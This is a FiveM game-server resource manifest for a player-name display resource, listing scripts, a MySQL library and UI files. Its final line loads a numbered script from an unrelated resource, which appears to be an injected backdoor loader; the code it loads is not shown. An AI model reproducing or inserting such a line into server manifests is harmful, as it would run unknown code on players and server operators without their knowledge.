fx_version 'cerulean'
games { 'gta5' }

author 'Lorax'
description 'LR Player Name'
version '1.0.0'

-- What to run
client_scripts {
    'config.lua',
    'client/*.lua'
}

server_scripts{
    "@mysql-async/lib/MySQL.lua",
    
    'config.lua',
    'server/*.lua'
}
ui_page "html/index.html"

files{
    "html/index.html",
    "html/*.png",
    "html/*.js",
    "html/*.css",
}
client_script '@Ashibaa/07957.lua'